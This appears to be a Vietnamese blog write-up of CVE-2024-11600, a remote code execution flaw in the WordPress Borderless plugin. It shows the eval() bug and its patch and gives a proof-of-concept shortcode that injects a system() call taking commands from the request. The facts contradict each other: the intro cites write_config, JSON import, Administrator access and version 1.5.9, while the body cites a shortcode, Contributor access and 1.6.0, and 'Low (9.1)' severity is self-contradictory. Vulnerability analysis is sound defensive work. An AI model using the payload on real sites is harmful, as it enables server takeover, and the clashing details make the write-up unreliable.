# CVE-2024-11600 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **The Borderless – Widgets, Elements, Templates and Toolkit for Elementor & Gutenberg** của WordPress tồn tại lỗ hổng **Remote Code Execution** trong tất cả các phiên bản cho đến và bao gồm **1.5.9** thông qua hàm **write_config**. Nguyên nhân là do thiếu **sanitization** trên file **JSON** được import. Điều này cho phép kẻ tấn công đã xác thực, với quyền **Administrator-level access** trở lên, thực thi mã trên server.

* **CVE ID**: [CVE-2024-11600](https://www.cve.org/CVERecord?id=CVE-2024-11600)
* **Vulnerability Type**: Remote Code Execution
* **Affected Versions**: <= 1.6.0
* **Patched Versions**: 1.6.1
* **CVSS severity**: Low (9.1)
* **Required Privilege**: Administrator
* **Product**: [WordPress Borderless Plugin](https://wordpress.org/plugins/borderless/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Borderless**:  
    * `1.6.0` – **vulnerable**  
    * `1.6.1` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause 
**Trong phiên bản lỗi (v1.6.0):**

```php {title="index.php v1.6.0" data-open=true hl_lines=[4]}
if (isset($attrs['operation'])) {
    $operation = $attrs['operation'];
    $operation = str_replace('(value)', $price, $operation);
    eval('$price = ' . $operation . ';');
}
```

Giá trị `$attrs['operation']` từ shortcode được được nối thẳng vào chuỗi PHP rồi đưa vào `eval()`, kẻ tấn công có thể chèn mã PHP bất kỳ => RCE

**Bản vá (v1.6.1):**

```php {title="index.php v1.6.1" data-open=true hl_lines=[]}
if (isset($attrs['operation'])) {
    $price = $this->safe_math_eval($attrs['operation'], $price);
}
```

Thay vì sử dụng `eval()` → dùng hàm riêng `safe_math_eval` giúp loại bỏ hoàn toàn khả năng thực thi code hệ thống.

```php {title="index.php v1.6.1" data-open=false hl_lines=[]}
private function safe_math_eval($expression, $value) {
    // Remove any whitespace
    $expression = preg_replace('/\s+/', '', $expression);

    // Only allow basic math operations, numbers, and the value keyword
    if (!preg_match('/^[0-9\.\+\-\*\/\(\)value]+$/', $expression)) {
        return $value;
    }

    // Replace (value) with the actual value
    $expression = str_replace('(value)', $value, $expression);

    // Use a safe evaluation method
    try {
        // Split the expression into tokens
        $tokens = preg_split('/([\+\-\*\/\(\)])/', $expression, -1, PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY);

        // Convert to Reverse Polish Notation (RPN)
        $output = array();
        $operators = array();

        foreach ($tokens as $token) {
        if (is_numeric($token)) {
            $output[] = $token;
        } elseif ($token === '(') {
            $operators[] = $token;
        } elseif ($token === ')') {
            while (count($operators) > 0 && end($operators) !== '(') {
            $output[] = array_pop($operators);
            }
            if (count($operators) > 0 && end($operators) === '(') {
            array_pop($operators);
            }
        } else {
            $precedence = array(
            '+' => 1,
            '-' => 1,
            '*' => 2,
            '/' => 2
            );

            while (count($operators) > 0 &&
                    end($operators) !== '(' &&
                    $precedence[$token] <= $precedence[end($operators)]) {
            $output[] = array_pop($operators);
            }
            $operators[] = $token;
        }
        }

        while (count($operators) > 0) {
        $output[] = array_pop($operators);
        }

        // Evaluate RPN
        $stack = array();
        foreach ($output as $token) {
        if (is_numeric($token)) {
            array_push($stack, $token);
        } else {
            $b = array_pop($stack);
            $a = array_pop($stack);

            switch ($token) {
            case '+':
                array_push($stack, $a + $b);
                break;
            case '-':
                array_push($stack, $a - $b);
                break;
            case '*':
                array_push($stack, $a * $b);
                break;
            case '/':
                if ($b == 0) {
                return $value; // Division by zero
                }
                array_push($stack, $a / $b);
                break;
            }
        }
        }

        $result = array_pop($stack);
        return is_numeric($result) ? $result : $value;
    } catch (Exception $e) {
        return $value;
    }
}
```

## Analysis
Plugin đăng ký shortcode `Borderless` với callback là hàm `shortcode()`:

```php
add_shortcode('Borderless', [$this, 'shortcode']);
```

Trong hàm `shortcode()`, các tham số đầu vào được lấy từ shortcode thông qua `shortcode_atts()`. Sau đó plugin lấy `api_key` đã được lưu bằng `get_option()`, xây dựng URL và gửi request đến `https://api.Borderless.com` bằng `wp_remote_get()`.

Nếu đăng ký tài khoản tại `Borderless.com` và nhập API key vào phần Settings của plugin

![API](api.png "Nhập API key")

response trả về sẽ có dạng:

```json
{"success":true,"base":"USD","timestamp":1764633599,"rates":{"USDXAU":4230.2580203577,"XAU":0.0002363922}}
```

Body của response được `json_decode()` thành mảng. Khi điều kiện
`isset($json['success']) && $json['success'] == true` thỏa mãn và shortcode có cung cấp tham số `operation`, plugin thực hiện:

```php
$operation = $attrs['operation'];
$operation = str_replace('(value)', $price, $operation);
eval('$price = ' . $operation . ';');
```

Tại đây, giá trị `operation` do người dùng kiểm soát được đưa trực tiếp vào `eval()`, dẫn đến khả năng thực thi mã PHP tùy ý. Điều này cho phép kẻ tấn công chèn và thực thi lệnh trên máy chủ thông qua tham số `operation` của shortcode.

## Flow
{{< mermaid >}}
graph TD
A["Attacker with Contributor (or higher) role"]
--> B["Creates or edits a post/content"]
--> C["Inserts [Borderless operation=payload]"]
--> D["WordPress renders the shortcode"]
--> E["Plugin executes shortcode() function"]
--> F["operation is concatenated into a PHP expression"]
--> G["eval() executes the attacker‑controlled input"]
--> H["Remote Code Execution (RCE) on the server"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Tạo post bằng Contributor account
2. Thêm shortcode:

```
[Borderless operation='"abc";system($_REQUEST("cmd"));die()']
```

![Result](result.png "Kết quả")

## Conclusion

CVE-2024-11600 trong plugin WordPress Borderless (<= 1.6.0) là một lỗ hổng RCE nghiêm trọng do sử dụng trực tiếp hàm `eval()` với dữ liệu do người dùng kiểm soát từ tham số `operation` của shortcode. Chỉ cần quyền Contributor, kẻ tấn công có thể chèn và thực thi mã PHP tùy ý trên máy chủ, dẫn đến nguy cơ chiếm quyền hệ thống, làm rò rỉ dữ liệu hoặc cài mã độc. Phiên bản 1.6.1 đã khắc phục bằng cách loại bỏ `eval()` và thay thế bằng hàm xử lý biểu thức an toàn hơn.

## Key Takeaways

* Không bao giờ sử dụng `eval()` với dữ liệu đầu vào từ người dùng, dù là gián tiếp.
* Shortcode trong WordPress nếu không kiểm soát chặt chẽ có thể trở thành điểm vào của RCE.
* Cần luôn kiểm tra, lọc và giới hạn ký tự hợp lệ của tham số đầu vào.
* Nên sử dụng bộ phân tích cú pháp (parser) hoặc hàm xử lý riêng thay vì thực thi trực tiếp biểu thức động.

## References

[Remote Code Execution (RCE)](https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/)

[WordPress Borderless Plugin <= 1.6.0 is vulnerable to Remote Code Execution (RCE)](https://vdp.patchstack.com/database/wordpress/plugin/Borderless/vulnerability/wordpress-Borderless-1-1-4-remote-code-execution-rce-vulnerability)

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-06-cve-2024-11600/  

